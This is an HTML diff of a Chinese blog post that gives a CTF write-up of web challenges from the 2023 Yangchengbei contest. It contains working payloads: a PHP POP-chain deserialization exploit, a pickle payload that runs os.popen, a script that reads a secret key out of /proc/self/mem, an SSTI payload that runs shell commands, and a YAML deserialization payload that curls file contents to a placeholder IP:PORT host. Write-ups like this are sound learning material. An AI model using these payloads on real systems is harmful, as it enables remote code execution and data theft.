@@ -1,0 +1,432 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023羊城杯] WEB部分WP | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023羊城杯] WEB部分WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="D0n't pl4y g4m3!!!
+访问/p0p.php页面跳转。抓包
+
+hint内容
+Ö_0 0vO Ow0 0w0 Ö_0 Ö_O Ö.O o_o 0.O OvO o.0 owo o.Ö Ö.Ö Ovo 0_Ö Ö_o owO O.0..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023羊城杯] WEB部分WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-09-03
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-yang-cheng-bei-web-bu-fen-wp.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="d0nt-pl4y-g4m3">D0n't pl4y g4m3!!!</h1>
+<p>访问/p0p.php页面跳转。抓包<br>
+<img src="https://skyblu3519.github.io/post-images/1693755467328.png" alt="" loading="lazy"></p>
+<p>hint内容</p>
+<pre><code>Ö_0 0vO Ow0 0w0 Ö_0 Ö_O Ö.O o_o 0.O OvO o.0 owo o.Ö Ö.Ö Ovo 0_Ö Ö_o owO O.0 owo Ö_o owO O.0 owo Ö_0 0wÖ O.0 0w0 Ö_0 OwO ov0 owo o_O O.Ö Övo 
+</code></pre>
+<p><a href="https://zdjd.vercel.app/">尊嘟假嘟0.o</a><br>
+<img src="https://skyblu3519.github.io/post-images/1693755481095.png" alt="" loading="lazy"></p>
+<p>根据题目提示，尝试PHP Development Server源码泄露</p>
+<pre><code>GET /p0p.php HTTP/1.1
+Host: tcp.cloud.dasctf.com:22585
+
+
+GET /1.zip HTTP/1.1
+
+
+</code></pre>
+<p>得到p0p.php源码</p>
+<pre><code class="language-php">&lt;?php
+  header(&quot;HTTP/1.1 302 found&quot;);
+header(&quot;Location:https://passer-by.com/pacman/&quot;);
+
+class Pro{
+  private $exp;
+  private $rce2;
+
+  public function __get($name)
+  {
+    return $this-&gt;$rce2=$this-&gt;exp[$rce2];
+  }
+  public  function __toString()
+  {
+    call_user_func('system', &quot;cat /flag&quot;);
+  }
+}
+
+class Yang
+{
+  public function __call($name, $ary)
+  {
+    if ($this-&gt;key === true || $this-&gt;finish1-&gt;name) {
+      if ($this-&gt;finish-&gt;finish) {
+        call_user_func($this-&gt;now[$name], $ary[0]);
+      }
+    }
+  }
+  public function ycb()
+  {
+    $this-&gt;now = 0;
+    return $this-&gt;finish-&gt;finish;
+  }
+  public function __wakeup()
+  {
+    $this-&gt;key = True;
+  }
+}
+class Cheng
+{
+  private $finish;
+  public $name;
+  public function __get($value)
+  {
+
+    return $this-&gt;$value = $this-&gt;name[$value];
+  }
+}
+class Bei
+{
+  public function __destruct()
+  {
+    if ($this-&gt;CTF-&gt;ycb()) {
+      $this-&gt;fine-&gt;YCB1($this-&gt;rce, $this-&gt;rce1);
+    }
+  }
+  public function __wakeup()
+  {
+    $this-&gt;key = false;
+  }
+}
+
+function prohib($a){
+  $filter = &quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;;
+  return preg_replace($filter,'',$a);
+}
+
+$a = $_POST[&quot;CTF&quot;];
+if (isset($a)){
+  unserialize(prohib($a));
+}
+  ?&gt;
+</code></pre>
+<p>入口点是<code>Bei::__destruct</code>，目的是用<code>Yang::__call</code>下的<code>call_user_func</code>读文件。构造POP链如下：</p>
+<pre><code class="language-php">&lt;?php
+class Yang
+{
+  public function __construct()
+  {
+    $this-&gt;finish = new Cheng();
+    $this-&gt;finish1 = new Cheng();
+    $this-&gt;now = array('YCB1' =&gt; 'readfile');
+  }
+}
+  
+class Cheng
+{
+	public $name = array('finish' =&gt; true);
+}
+
+class Bei
+{
+  public function __construct()
+  {
+    $this-&gt;CTF = new Yang();
+    $this-&gt;fine = new Yang();
+    $this-&gt;rce = '/tmp/catcatf1ag.txt';
+    $this-&gt;rce1 = '';
+  }
+}
+
+echo serialize(new Bei());
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1693755518480.png" alt="" loading="lazy"></figure>
+<h1 id="serpent">Serpent</h1>
+<p>首先base64解码session得到secret key，session伪造admin访问的到路由<code>/ppppppppppick1e</code>。</p>
+<p>在响应头中得到剩下后面一部分的源码。<br>
+<img src="https://skyblu3519.github.io/post-images/1693755553260.png" alt="" loading="lazy"></p>
+<p>pick1e反序列化，结果测试check过滤的是<code>R</code>。使用pker的<code>INST</code>构造一个不用<code>R</code>的函数执行。方法如下：</p>
+<p>将下面的内容保存为文件x，这里面使用了<code>builtins</code>模块下的<code>exec</code>函数执行了后面的代码。因为页面没有回显，而flask开启了debug模式，所以可以用<code>raise</code>将执行的结果抛出错误回显在页面上。</p>
+<pre><code class="language-php">INST('builtins', 'exec', 'raise Exception(__import__(&quot;os&quot;).popen(&quot;id&quot;).read())')
+return
+</code></pre>
+<p>执行<code>python pker.py &lt; x</code>就得到了恶意的序列化字符串。</p>
+<pre><code>➜  pker git:(master) ✗ vim x             
+➜  pker git:(master) ✗ python pker.py &lt; x
+b'(S\'raise Exception(__import__(&quot;os&quot;).popen(&quot;id&quot;).read())\'\nibuiltins\nexec\n.'
+</code></pre>
+<p>按照题目，将其base64后放在cookie中便可执行代码。<br>
+<img src="https://skyblu3519.github.io/post-images/1693755598577.png" alt="" loading="lazy"></p>
+<p>flag权限不够读，考虑suid提权。使用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>寻在具有suid权限的程序。<br>
+<img src="https://skyblu3519.github.io/post-images/1693755608010.png" alt="" loading="lazy"></p>
+<p>有python，写一个python脚本去读/flag</p>
+<pre><code class="language-python"># 写入
+__import__(&quot;os&quot;).popen(&quot;echo 'd2l0aCBvcGVuKCIvZmxhZyIsICJyIikgYXMgZjogcHJpbnQoZi5yZWFkKCkp' | base64 -d &gt; /tmp/2.py&quot;)
+
+# 读取
+__import__(&quot;os&quot;).popen(&quot;/usr/bin/python3.8 /tmp/2.py&quot;)
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1693755642995.png" alt="" loading="lazy"></figure>
+<h1 id="arknights">ArkNights</h1>
+<p>没解出 sad...☹️</p>
+<h2 id="step1-procselfmaps-procselfmem-读secret-key">Step1: /proc/self/maps + /proc/self/mem 读secret key</h2>
+<p>快速了解下背景知识。</p>
+<p><code>/proc/self/maps </code>表示当前进程的内存映射信息。里面的每一行像这样：</p>
+<pre><code>00400000-00452000 r-xp 00000000 08:02 893384                /usr/bin/dbus-daemon
+</code></pre>
+<p>这一行表示：</p>
+<ul>
+<li>地址范围：从 00400000 到 00452000</li>
+<li>权限：r-xp (readable, executable, private)</li>
+<li>偏移量：00000000</li>
+<li>设备：08:02</li>
+<li>inode：893384</li>
+<li>文件路径：/usr/bin/dbus-daemon</li>
+</ul>
+<p><code>/proc/self/mem</code>表示当前进程的虚拟内存，关于读这个文件的方法可以参阅：<a href="https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux">How do I read from /proc/$pid/mem under Linux?</a></p>
+<p>理论上来讲，一个python代码中所有的变量都会被载入内存，那么secret key也就可以在/proc/self/mem找到。</p>
+<p>题目中的<code>/read</code>路由就可以做这件事，而<code>app.config['SECRET_KEY'] = str(uuid.uuid4()).replace(&quot;-&quot;,&quot;*&quot;)+&quot;Boogipopisweak&quot;</code>为<code>SECRET_KEY</code>加上特殊字符串也是为了方便我们从大量的内存信息中把密钥匹配出来。</p>
+<p>简单写下爆破脚本</p>
+<pre><code class="language-python">import requests
+import re
+
+
+def hex_to_dec(hex_string):
+    return int(hex_string, 16)
+
+
+url = &quot;http://5000.endpoint-f28e0448e7a148dbb6f269e2aadd3344.m.ins.cloud.dasctf.com:81/read&quot;
+param = {&quot;file&quot;: &quot;/proc/self/maps&quot;}
+resp = requests.get(url, params=param)
+_maps = resp.text
+maps = _maps.split('\n')
+
+for s in maps:
+    pattern1 = r&quot;([0-9a-f]+)-([0-9a-f]+)&quot;
+    match = re.search(pattern1, s)
+    start_address = hex_to_dec(match.group(1))
+    end_address = hex_to_dec(match.group(2))
+    
+    p = {
+        &quot;file&quot;: &quot;/proc/self/mem&quot;,
+        &quot;start&quot;: start_address,
+        &quot;end&quot;: end_address - start_address
+    }
+    resp = requests.get(url, params=p)
+    if &quot;Boogipopisweak&quot; in resp.text:
+        print(resp.text)
+        print(s)
+        break
+</code></pre>
+<h2 id="step2-ssti">Step2: SSTI</h2>
+<p>先看一个例子，python在执行这样的代码的时候：</p>
+<pre><code class="language-python">for os.system('open -a /Applications/Typora.app') in range(123):
+    pass
+</code></pre>
+<p>它会直接提示错误<code>**SyntaxError: cannot assign to function call**</code><br>
+<img src="https://skyblu3519.github.io/post-images/1693755696276.png" alt="" loading="lazy"></p>
+<p>而在<code>os.system('open -a /Applications/Typora.app')</code>加一个<code>.read</code></p>
+<pre><code class="language-python">for os.system('open -a /Applications/Typora.app').read in range(123):
+    pass
+</code></pre>
+<p>它会提示<code>**AttributeError: 'int' object has no attribute 'read'**</code>，但与此同时还执行了<code>os.system('open -a /Applications/Typora.app')</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/1693755713075.png" alt="" loading="lazy"></p>
+<p>尽管得到了一个错误，但<code>os.system('open -a /Applications/Typora.app')</code>确实被执行了，因为在尝试访问它的read属性之前，Python已经计算了这个表达式。</p>
+<p>同理随便什么属性都可以达到这样的效果。<br>
+<img src="https://skyblu3519.github.io/post-images/1693755785950.png" alt="" loading="lazy"></p>
+<p>回到题目，在伪造了session['name']后，在<code>exec</code>处可以通过控制name变量来达到一种模版注入的效果。<br>
+<img src="https://skyblu3519.github.io/post-images/1693755793284.png" alt="" loading="lazy"></p>
+<p>虽然没有回显，但是在最后一个路由的地方看到了该环境下引入了<code>os</code><br>
+<img src="https://skyblu3519.github.io/post-images/1693755801900.png" alt="" loading="lazy"></p>
+<p>最后的payload一看就懂</p>
+<pre><code>GET /?name=app.__init__.__globals__.__getitem__(request.user_agent.string).popen(request.headers.__getitem__(request.user_agent.string)).read&amp;m1sery=().__class__.__base__ HTTP/1.1
+Host: 5000.endpoint-902a5d8df3fe492c9bf7398a88c9b8f4.m.ins.cloud.dasctf.com:81
+User-Agent: os
+os:cat /flag &gt; /tmp/1.txt
+Cookie: session=eyJuYW1lIjoiRHIuQm9vZzFwb3AifQ.ZPM9aw.R8j0mX2-SNAgJt1lnzJvhASJir4
+</code></pre>
+<h1 id="ezyaml">EZyaml</h1>
+<p>tar解压目录穿越+yaml反序列化</p>
+<p>上传保存的文件路径为<code>/uploads</code>，反序列yaml的路径在<code>/config</code>下。而上传tar文件，会进行解压。使用tar目录穿越使文件解压时穿越<code>/uploads</code>到<code>/config</code>下<br>
+<img src="https://skyblu3519.github.io/post-images/1693755831670.png" alt="" loading="lazy"></p>
+<p>制作可以目录穿越的tar的方法。准备一个可以通过<code>../../config/</code>访问到需要压缩文件的目录结构，like this</p>
+<pre><code>./
+├── config
+│   ├── user1.yaml
+│   └── user2.yaml
+└── uploads
+    └── 1
+</code></pre>
+<p>这里我们到<code>uploads/1</code>目录下执行<code>tar cPvf 1.tar ../../config/user1.yaml</code>。上传这个tar解压后就会穿越到config目录下。</p>
+<p>之后的yaml反序列化就很简单了，随便找个payload打就行。用的curl把数据带出来。</p>
+<pre><code>!!python/object/new:tuple
+- !!python/object/new:map
+  - !!python/name:exec
+  - [ &quot;import os; result = os.popen('cat /fllaagg_here').read(); result = result.replace(\&quot;\\n\&quot;, \&quot; \&quot;).replace(\&quot; \&quot;, \&quot;%20\&quot;); url = f\&quot;http://IP:PORT/?data={result}\&quot;; os.system(f\&quot;curl '{url}'\&quot;)&quot; ]
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/1693755875799.png" alt="" loading="lazy"></figure>
+<p>ps.该学java了哥</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#d0nt-pl4y-g4m3">D0n't pl4y g4m3!!!</a></li>
+<li><a href="#serpent">Serpent</a></li>
+<li><a href="#arknights">ArkNights</a>
+<ul>
+<li><a href="#step1-procselfmaps-procselfmem-%E8%AF%BBsecret-key">Step1: /proc/self/maps + /proc/self/mem 读secret key</a></li>
+<li><a href="#step2-ssti">Step2: SSTI</a></li>
+</ul>
+</li>
+<li><a href="#ezyaml">EZyaml</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/2023-lan-mao-bei-lovephp/">
+              <h3 class="post-title">
+                [2023蓝帽杯] lovePHP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
